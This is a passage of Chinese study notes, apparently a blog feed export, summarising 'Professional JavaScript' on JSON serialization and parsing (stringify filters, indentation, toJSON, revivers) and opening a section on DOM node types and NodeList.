<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123; </span><br><span class="line">    name: <span class="string">"Nicholas"</span>,</span><br><span class="line">    age: <span class="number">29</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这虽然是开发人员在JavaScript中创建对象字面量的标准方式，但JSON中的对象要求给属性加引号。实际上，在JavaScript中，前面的对象字面量完全可以写成下面这样：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> object = &#123; </span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"Nicholas"</span>,</span><br><span class="line">    <span class="string">"age"</span>: <span class="number">29</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>JSON表示上述对象的方式如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"Nicholas"</span>,</span><br><span class="line">    <span class="string">"age"</span>: <span class="number">29</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与JavaScript的对象字面量相比，JSON对象有两个地方不一样。首先，没有声明变量（JSON中没有变量的概念）。其次，没有末尾的分号（因为这不是JavaScript语句，所以不需要分号）。再说一遍，对象的属性必须加双引号，这在JSON中是必需的。属性的值可以是简单值，也可以是复杂类型值，因此可以像下面这样在对象中嵌入对象：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"Nicholas"</span>,</span><br><span class="line">    <span class="string">"age"</span>: <span class="number">29</span>,</span><br><span class="line">    <span class="string">"school"</span>: &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"Merrimack College"</span>,</span><br><span class="line">        <span class="string">"location"</span>: <span class="string">"North Andover, MA"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个例子在顶级对象中嵌入了学校（“school”）信息。虽然有两个&quot;name&quot;属性，但由于它们分别属于不同的对象，因此这样完全没有问题。不过，同一个对象中绝对不应该出现两个同名属性。</p>
<p>与JavaScript不同，JSON中对象的属性名任何时候都必须加双引号。手工编写JSON时，忘了给对象属性名加双引号或者把双引号写成单引号都是常见的错误。</p>
<h3 id="数组"><a class="markdownIt-Anchor" href="#数组"></a> 数组</h3>
<p>JSON中的第二种复杂数据类型是数组。JSON数组采用的就是JavaScript中的数组字面量形式。例如，下面是JavaScript中的数组字面量：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> values = [<span class="number">25</span>, <span class="string">"hi"</span>, <span class="literal">true</span>];</span><br></pre></td></tr></table></figure>
<p>在JSON中，可以采用同样的语法表示同一个数组：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">25</span>, <span class="string">"hi"</span>, <span class="literal">true</span>]</span><br></pre></td></tr></table></figure>
<p>同样要注意，JSON数组也没有变量和分号。把数组和对象结合起来，可以构成更复杂的数据集合，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">         <span class="string">"authors"</span>: [</span><br><span class="line">             <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">         ],</span><br><span class="line">         edition: <span class="number">3</span>,</span><br><span class="line">         year: <span class="number">2011</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">         <span class="string">"authors"</span>: [</span><br><span class="line">              <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">         ],</span><br><span class="line">         edition: <span class="number">2</span>,</span><br><span class="line">         year: <span class="number">2009</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="string">"title"</span>: <span class="string">"Professional Ajax"</span>,</span><br><span class="line">         <span class="string">"authors"</span>: [</span><br><span class="line">             <span class="string">"Nicholas C. Zakas"</span>,</span><br><span class="line">             <span class="string">"Jeremy McPeak"</span>,</span><br><span class="line">             <span class="string">"Joe Fawcett"</span></span><br><span class="line">         ],</span><br><span class="line">         edition: <span class="number">2</span>,</span><br><span class="line">         year: <span class="number">2008</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="string">"title"</span>: <span class="string">"Professional Ajax"</span>,</span><br><span class="line">         <span class="string">"authors"</span>: [</span><br><span class="line">             <span class="string">"Nicholas C. Zakas"</span>,</span><br><span class="line">             <span class="string">"Jeremy McPeak"</span>,</span><br><span class="line">             <span class="string">"Joe Fawcett"</span></span><br><span class="line">         ],</span><br><span class="line">         edition: <span class="number">1</span>,</span><br><span class="line">         year: <span class="number">2007</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">         <span class="string">"authors"</span>: [</span><br><span class="line">              <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">         ],</span><br><span class="line">         edition: <span class="number">1</span>,</span><br><span class="line">         year: <span class="number">2006</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>这个数组中包含一些表示图书的对象。每个对象都有几个属性，其中一个属性是&quot;authors&quot;，这个属性的值又是一个数组。对象和数组通常是JSON数据结构的最外层形式（当然，这不是强制规定的），利用它们能够创造出各种各样的数据结构。</p>
<h2 id="解析与序列化"><a class="markdownIt-Anchor" href="#解析与序列化"></a> 解析与序列化</h2>
<p>JSON之所以流行，拥有与JavaScript类似的语法并不是全部原因。更重要的一个原因是，可以把JSON数据结构解析为有用的JavaScript对象。与XML数据结构要解析成DOM文档而且从中提取数据极为麻烦相比，JSON可以解析为JavaScript对象的优势极其明显。就以上一节中包含一组图书的JSON数据结构为例，在解析为JavaScript对象后，只需要下面一行简单的代码就可以取得第三本书的书名：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">books[<span class="number">2</span>].title</span><br></pre></td></tr></table></figure>
<p>当然，这里是假设把解析后JSON数据结构得到的对象保存到了变量books中。再看看下面在DOM结构中查找数据的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">doc.getElementsByTagName(<span class="string">"book"</span>)[<span class="number">2</span>].getAttribute(<span class="string">"title"</span>)</span><br></pre></td></tr></table></figure>
<p>看看这些多余的方法调用，就不难理解为什么JSON能得到JavaScript开发人员的热烈欢迎了。从此以后，JSON就成了Web服务开发中交换数据的事实标准。</p>
<h3 id="json-对象"><a class="markdownIt-Anchor" href="#json-对象"></a> JSON 对象</h3>
<p>早期的JSON解析器基本上就是使用JavaScript的eval()函数。由于JSON是JavaScript语法的子集，因此eval()函数可以解析、解释并返回JavaScript对象和数组。ECMAScript 5对解析JSON的行为进行规范，定义了全局对象JSON。支持这个对象的浏览器有IE 8+、Firefox 3.5+、Safari 4+、Chrome和Opera 10.5+。对于较早版本的浏览器，可以使用一个shim：<a href="https://github.com/douglascrockford/JSON-js" target="_blank" rel="noopener">https://github.com/douglascrockford/JSON-js</a> 在旧版本的浏览器中，使用eval()对JSON数据结构求值存在风险，因为可能会执行一些恶意代码。对于不能原生支持JSON解析的浏览器，使用这个shim是最佳选择。</p>
<p>JSON对象有两个方法：<mark>stringify()</mark> 和 <mark>parse()</mark>。在最简单的情况下，这两个方法分别用于把JavaScript对象序列化为JSON字符串和把JSON字符串解析为原生JavaScript值。例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123; </span><br><span class="line">                title: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">                authors: [</span><br><span class="line">                   <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">                ],</span><br><span class="line">                edition: <span class="number">3</span>,</span><br><span class="line">                year: <span class="number">2011</span></span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book);</span><br></pre></td></tr></table></figure>
<p>JSONStringifyExample01.htm</p>
<p>这个例子使用JSON.stringify()把一个JavaScript对象序列化为一个JSON字符串，然后将它保存在变量jsonText中。默认情况下，JSON.stringify()输出的JSON字符串不包含任何空格字符或缩进，因此保存在jsonText中的字符串如下所示：<br />
这个例子使用JSON.stringify()把一个JavaScript对象序列化为一个JSON字符串，然后将它保存在变量jsonText中。默认情况下，JSON.stringify()输出的JSON字符串不包含任何空格字符或缩进，因此保存在jsonText中的字符串如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"title"</span>:<span class="string">"Professional JavaScript"</span>,<span class="string">"authors"</span>:[<span class="string">"Nicholas C. Zakas"</span>],<span class="string">"edition"</span>:<span class="number">3</span>,</span><br><span class="line"><span class="string">"year"</span>:<span class="number">2011</span>&#125;</span><br></pre></td></tr></table></figure>
<p><ins>在序列化JavaScript对象时，所有函数及原型成员都会被有意忽略，不体现在结果中。此外，值为undefined的任何属性也都会被跳过。</ins> 结果中最终都是值为有效JSON数据类型的实例属性。</p>
<p>将JSON字符串直接传递给JSON.parse()就可以得到相应的JavaScript值。例如，使用下列代码就可以创建与book类似的对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var bookCopy &#x3D; JSON.parse(jsonText);</span><br></pre></td></tr></table></figure>
<p>注意，虽然book与bookCopy具有相同的属性，但它们是两个独立的、没有任何关系的对象。</p>
<p>如果传给JSON.parse()的字符串不是有效的JSON，该方法会抛出错误。</p>
<h3 id="序列化选项"><a class="markdownIt-Anchor" href="#序列化选项"></a> 序列化选项</h3>
<p>实际上，JSON.stringify()除了要序列化的JavaScript对象外，还可以接收另外两个参数，这两个参数用于指定以不同的方式序列化JavaScript对象。第一个参数是个过滤器，可以是一个数组，也可以是一个函数；第二个参数是一个选项，表示是否在JSON字符串中保留缩进。单独或组合使用这两个参数，可以更全面深入地控制JSON的序列化。</p>
<ol>
<li>过滤结果</li>
</ol>
<p>如果过滤器参数是数组，那么JSON.stringify()的结果中将只包含数组中列出的属性。来看下面的例子。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123; </span><br><span class="line">               <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">                <span class="string">"authors"</span>: [</span><br><span class="line">                   <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">                ],</span><br><span class="line">                edition: <span class="number">3</span>,</span><br><span class="line">                year: <span class="number">2011</span></span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book, [<span class="string">"title"</span>, <span class="string">"edition"</span>]);</span><br></pre></td></tr></table></figure>
<p>JSONStringifyExample01.htm</p>
<p>JSON.stringify()的第二个参数是一个数组，其中包含两个字符串：“title&quot;和&quot;edition”。这两个属性与将要序列化的对象中的属性是对应的，因此在返回的结果字符串中，就只会包含这两个属性：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"title"</span>:<span class="string">"Professional JavaScript"</span>,<span class="string">"edition"</span>:<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>
<p>如果第二个参数是函数，行为会稍有不同。传入的函数接收两个参数，属性（键）名和属性值。根据属性（键）名可以知道应该如何处理要序列化的对象中的属性。属性名只能是字符串，而在值并非键值对儿结构的值时，键名可以是空字符串。</p>
<p>为了改变序列化对象的结果，函数返回的值就是相应键的值。<ins>不过要注意，如果函数返回了undefined，那么相应的属性会被忽略。</ins> 还是看一个例子吧。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123; </span><br><span class="line">                <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">                <span class="string">"authors"</span>: [</span><br><span class="line">                    <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">                ],</span><br><span class="line">                edition: <span class="number">3</span>,</span><br><span class="line">                year: <span class="number">2011</span></span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book, <span class="function"><span class="keyword">function</span>(<span class="params">key, value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(key)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"authors"</span>:</span><br><span class="line">            <span class="keyword">return</span> value.join(<span class="string">","</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"year"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"edition"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>JSONStringifyExample02.htm</p>
<p>这里，函数过滤器根据传入的键来决定结果。如果键为&quot;authors&quot;，就将数组连接为一个字符串；如果键为&quot;year&quot;，则将其值设置为5000；如果键为&quot;edition&quot;，通过返回undefined删除该属性。最后，一定要提供default项，此时返回传入的值，以便其他值都能正常出现在结果中。实际上，第一次调用这个函数过滤器，传入的键是一个空字符串，而值就是book对象。序列化后的JSON字符串如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"title"</span>:<span class="string">"Professional JavaScript"</span>,<span class="string">"authors"</span>:<span class="string">"Nicholas C. Zakas"</span>,<span class="string">"year"</span>:<span class="number">5000</span>&#125;</span><br></pre></td></tr></table></figure>
<p>要序列化的对象中的每一个对象都要经过过滤器，因此数组中的每个带有这些属性的对象经过过滤之后，每个对象都只会包含&quot;title&quot;、&quot;authors&quot;和&quot;year&quot;属性。</p>
<p>Firefox 3.5和3.6对JSON.stringify()的实现有一个bug，在将函数作为该方法的第二个参数时这个bug就会出现：过滤函数返回undefined意味着要跳过某个属性，而返回其他任何值都会在结果中包含相应的属性。Firefox 4修复了这个bug。</p>
<ol start="2">
<li>字符串缩进</li>
</ol>
<p>JSON.stringify()方法的第三个参数用于控制结果中的缩进和空白符。如果这个参数是一个数值，那它表示的是每个级别缩进的空格数。例如，要在每个级别缩进4个空格，可以这样写代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123; </span><br><span class="line">                <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">                <span class="string">"authors"</span>: [</span><br><span class="line">                    <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">                ],</span><br><span class="line">                edition: <span class="number">3</span>,</span><br><span class="line">                year: <span class="number">2011</span></span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book, <span class="literal">null</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>JSONStringifyExample03.htm</p>
<p>保存在jsonText中的字符串如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">    <span class="string">"authors"</span>: [</span><br><span class="line">        <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">"year"</span>: <span class="number">2011</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不知道读者注意到没有，JSON.stringify()也在结果字符串中插入了换行符以提高可读性。<ins>只要传入有效的控制缩进的参数值，结果字符串就会包含换行符。（只缩进而不换行意义不大。）最大缩进空格数为10，所有大于10的值都会自动转换为10。</ins></p>
<p>如果缩进参数是一个字符串而非数值，则这个字符串将在JSON字符串中被用作缩进字符（不再使用空格）。在使用字符串的情况下，可以将缩进字符设置为制表符，或者两个短划线之类的任意字符。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book, <span class="literal">null</span>, <span class="string">" — -"</span>);</span><br></pre></td></tr></table></figure>
<p>这样，jsonText中的字符串将变成如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">  <span class="string">"authors"</span>: [</span><br><span class="line">    <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"edition"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"year"</span>: <span class="number">2011</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>缩进字符串最长不能超过10个字符长。如果字符串长度超过了10个，结果中将只出现前10个字符。</p>
<ol start="3">
<li>toJSON()方法</li>
</ol>
<p>有时候，JSON.stringify()还是不能满足对某些对象进行自定义序列化的需求。在这些情况下，可以通过对象上调用toJSON()方法，返回其自身的JSON数据格式。原生Date对象有一个toJSON()方法，能够将JavaScript的Date对象自动转换成ISO 8601日期字符串（与在Date对象上调用toISOString()的结果完全一样）。</p>
<p>可以为任何对象添加toJSON()方法，比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">            <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">             <span class="string">"authors"</span>: [</span><br><span class="line">                 <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">            ],</span><br><span class="line">            edition: <span class="number">3</span>,</span><br><span class="line">            year: <span class="number">2011</span>,</span><br><span class="line">             toJSON: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="keyword">this</span>.title;</span><br><span class="line">                 &#125;</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book);</span><br></pre></td></tr></table></figure>
<p>JSONStringifyExample05.htm</p>
<p>以上代码在book对象上定义了一个toJSON()方法，该方法返回图书的书名。与Date对象类似，这个对象也将被序列化为一个简单的字符串而非对象。可以让toJSON()方法返回任何序列化的值，它都能正常工作。也可以让这个方法返回undefined，此时如果包含它的对象嵌入在另一个对象中，会导致该对象的值变成null，而如果包含它的对象是顶级对象，结果就是undefined。</p>
<p>toJSON()可以作为函数过滤器的补充，因此理解序列化的内部顺序十分重要。假设把一个对象传入JSON.stringify()，序列化该对象的顺序如下。</p>
<ol>
<li>如果存在toJSON()方法而且能通过它取得有效的值，则调用该方法。否则，按默认顺序执行序列化。</li>
<li>如果提供了第二个参数，应用这个函数过滤器。传入函数过滤器的值是第1步返回的值。</li>
<li>对第2步返回的每个值进行相应的序列化。</li>
<li>如果提供了第三个参数，执行相应的格式化。</li>
</ol>
<p>无论是考虑定义toJSON()方法，还是考虑使用函数过滤器，亦或需要同时使用两者，理解这个顺序都是至关重要的。</p>
<h3 id="解析选项"><a class="markdownIt-Anchor" href="#解析选项"></a> 解析选项</h3>
<p>JSON.parse()方法也可以接收另一个参数，该参数是一个函数，将在每个键值对儿上调用。为了区别JSON.stringify()接收的替换（过滤）函数（replacer），这个函数被称为还原函数（reviver），但实际上这两个函数的签名是相同的——它们都接收两个参数，一个键和一个值，而且都需要返回一个值。</p>
<p>如果还原函数返回undefined，则表示要从结果中删除相应的键；如果返回其他值，则将该值插入到结果中。在将日期字符串转换为Date对象时，经常要用到还原函数。例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123; </span><br><span class="line">              <span class="string">"title"</span>: <span class="string">"Professional JavaScript"</span>,</span><br><span class="line">               <span class="string">"authors"</span>: [</span><br><span class="line">                   <span class="string">"Nicholas C. Zakas"</span></span><br><span class="line">                ],</span><br><span class="line">                edition: <span class="number">3</span>,</span><br><span class="line">                year: <span class="number">2011</span>,</span><br><span class="line">                releaseDate: <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2011</span>, <span class="number">11</span>, <span class="number">1</span>)</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="built_in">JSON</span>.stringify(book);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bookCopy = <span class="built_in">JSON</span>.parse(jsonText, <span class="function"><span class="keyword">function</span>(<span class="params">key, value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="string">"releaseDate"</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">alert(bookCopy.releaseDate.getFullYear());</span><br></pre></td></tr></table></figure>
<p>JSONParseExample02.htm</p>
<p>以上代码先是为book对象新增了一个releaseDate属性，该属性保存着一个Date对象。这个对象在经过序列化之后变成了有效的JSON字符串，然后经过解析又在bookCopy中还原为一个Date对象。还原函数在遇到&quot;releaseDate&quot;键时，会基于相应的值创建一个新的Date对象。结果就是bookCopy.releaseDate属性中会保存一个Date对象。正因为如此，才能基于这个对象调用getFullYear()方法。</p>
<h3 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h3>
<p>JSON是一个轻量级的数据格式，可以简化表示复杂数据结构的工作量。JSON使用JavaScript语法的子集表示对象、数组、字符串、数值、布尔值和null。即使XML也能表示同样复杂的数据结果，但JSON没有那么烦琐，而且在JavaScript中使用更便利。</p>
<p>ECMAScript 5定义了一个原生的JSON对象，可以用来将对象序列化为JSON字符串或者将JSON数据解析为JavaScript对象。JSON.stringify()和JSON.parse()方法分别用来实现上述两项功能。这两个方法都有一些选项，通过它们可以改变过滤的方式，或者改变序列化的过程。</p>
<p>原生的JSON对象也得到了很多浏览器的支持，比如IE8+、Firefox 3.5+、Safari 4+、Opera 10.5和Chrome。</p>
<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
<p><a href="http://www.wrox.com/" target="_blank" rel="noopener">javascript 高级程序设计 【第3版】</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>json</tag>
        <tag>learning-notes</tag>
      </tags>
  </entry>
  <entry>
    <title>JS高程－DOM</title>
    <url>/hexolog/post/ab8e0436.html</url>
    <content><![CDATA[<blockquote>
<p>DOM（文档对象模型）是针对HTML和XML文档的一个API（应用程序编程接口），描绘了一个层次化的节点树，允许开发人员添加、移除和修改页面的某一部分。</p>
</blockquote>
<blockquote>
<p>DOM１级规范成为W3C的推荐标准，为基本的文档结构及查询提供了接口。本章主要讨论与浏览器中的HTML页面相关的DOM1级的特性和应用，以及JavaScript对DOM1级的实现。IE、Firefox、Safari、Chrome和Opera都非常完善地实现了DOM。</p>
</blockquote>
<h3 id="节点层次"><a class="markdownIt-Anchor" href="#节点层次"></a> 节点层次</h3>
<p>DOM可以将任何HTML或XML文档描绘成一个由多层节点构成的结构。节点分为几种不同的类型，每种类型分别表示文档中不同的信息及（或）标记。每个节点都拥有各自的特点、数据和方法，另外也与其他节点存在某种关系。节点之间的关系构成了层次，而所有页面标记则表现为一个以特定节点为根节点的树形结构。以下面的HTML为例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sample Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>对应树形结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Document   &#x2F;&#x2F; 根节点</span><br><span class="line">|--Element   &#x2F;&#x2F; html   根节点的子节点称为&quot;文档节点&quot;</span><br><span class="line">|  |--Element    &#x2F;&#x2F; head</span><br><span class="line">|     |--Element    &#x2F;&#x2F; title</span><br><span class="line">|        |--Text    &#x2F;&#x2F; Sample Page</span><br><span class="line">|  |--Element    &#x2F;&#x2F; body      </span><br><span class="line">|     |--Element    &#x2F;&#x2F; p</span><br><span class="line">|        |--Text    &#x2F;&#x2F; Hello World!</span><br></pre></td></tr></table></figure>
<p>每一段标记都可以通过树中的一个节点来表示：HTML元素通过元素节点表示，特性（attribute）通过特性节点表示，文档类型通过文档类型节点表示，而注释则通过注释节点表示。总共有12种节点类型，这些类型都继承自一个基类型，即 <code>Node</code> 类型。</p>
<h4 id="node-类型"><a class="markdownIt-Anchor" href="#node-类型"></a> <code>Node</code> 类型</h4>
<p>DOM1级定义了一个Node接口，这个Node接口在JavaScript中是作为Node类型实现的；除了IE之外，在其他所有浏览器中都可以访问到这个类型。JavaScript中的所有节点类型都继承自Node类型，因此所有节点类型都共享着相同的基本属性和方法。</p>
<p>每个节点都有一个 <code>nodeType</code> 属性，用于表明节点的类型。节点类型由在Node类型中定义的下列12个数值常量来表示，任何节点类型必居其一：</p>
<ul>
<li>Node.ELEMENT_NODE(1)；</li>
<li>Node.ATTRIBUTE_NODE(2)；</li>
<li>Node.TEXT_NODE(3)；</li>
<li>Node.CDATA_SECTION_NODE(4)；</li>
<li>Node.ENTITY_REFERENCE_NODE(5)；</li>
<li>Node.ENTITY_NODE(6)；</li>
<li>Node.PROCESSING_INSTRUCTION_NODE(7)；</li>
<li>Node.COMMENT_NODE(8)；</li>
<li>Node.DOCUMENT_NODE(9)；</li>
<li>Node.DOCUMENT_TYPE_NODE(10)；</li>
<li>Node.DOCUMENT_FRAGMENT_NODE(11)；</li>
<li>Node.NOTATION_NODE(12)。</li>
</ul>
<p>通过比较上面这些常量，可以很容易地确定节点的类型，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (someNode.nodeType == Node.ELEMENT_NODE)&#123;   <span class="comment">//在IE中无效</span></span><br><span class="line">    alert(<span class="string">"Node is an element."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (someNode.nodeType == <span class="number">1</span>)&#123;    <span class="comment">//适用于所有浏览器</span></span><br><span class="line">    alert(<span class="string">"Node is an element."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="nodename-与-nodevalue-属性"><a class="markdownIt-Anchor" href="#nodename-与-nodevalue-属性"></a> <strong><code>nodeName</code> 与 <code>NodeValue</code> 属性</strong></h5>
<p>在使用这两个值以前，最好是像下面这样先检测一下节点的类型。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (someNode.nodeType == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> nameN = someNode.nodeName;    <span class="comment">//nodeName的值是元素的标签名</span></span><br><span class="line">    <span class="keyword">var</span> valueN = someNode.nodeValue;  <span class="comment">//元素的nodeValue的值则始终为null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="节点关系"><a class="markdownIt-Anchor" href="#节点关系"></a> <strong>节点关系</strong></h5>
<blockquote>
<p><code>.childNodes</code>，<code>.parentNode</code>，<code>.previousSibling</code> 和 <code>.nextSibling</code>，<code>.firstChild</code> 和 <code>.lastChild</code>，<code>.hasChildNodes()</code>，<code>.ownerDocument</code></p>
</blockquote>
<p>每个节点都有一个 <code>childNodes</code> 属性，其中保存着一个NodeList对象。NodeList是一种类数组对象，用于保存一组有序的节点，可以通过位置来访问这些节点。请注意，虽然可以通过方括号语法来访问NodeList的值，而且这个对象也有length属性，但它并不是Array的实例。NodeList对象的独特之处在于，它实际上是基于DOM结构动态执行查询的结果，因此DOM结构的变化能够自动反映在NodeList对象中。NodeList就好像是有生命、有呼吸的对象，而不是在我们第一次访问它们的某个瞬间拍摄下来的一张快照。</p>
<p>下面的例子展示了如何访问保存在NodeList中的节点——可以通过方括号，也可以使用item()方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstChild = someNode.childNodes[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> secondChild = someNode.childNodes.item(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> count = someNode.childNodes.length;</span><br></pre></td></tr></table></figure>
<p>本书前面介绍过，对arguments对象使用Array.prototype.slice()方法可以将其转换为数组。而采用同样的方法，也可以将NodeList对象转换为数组。来看下面的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在IE8及之前版本中无效</span></span><br><span class="line"><span class="keyword">var</span> arrayOfNodes = <span class="built_in">Array</span>.prototype.slice.call(someNode.childNodes,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
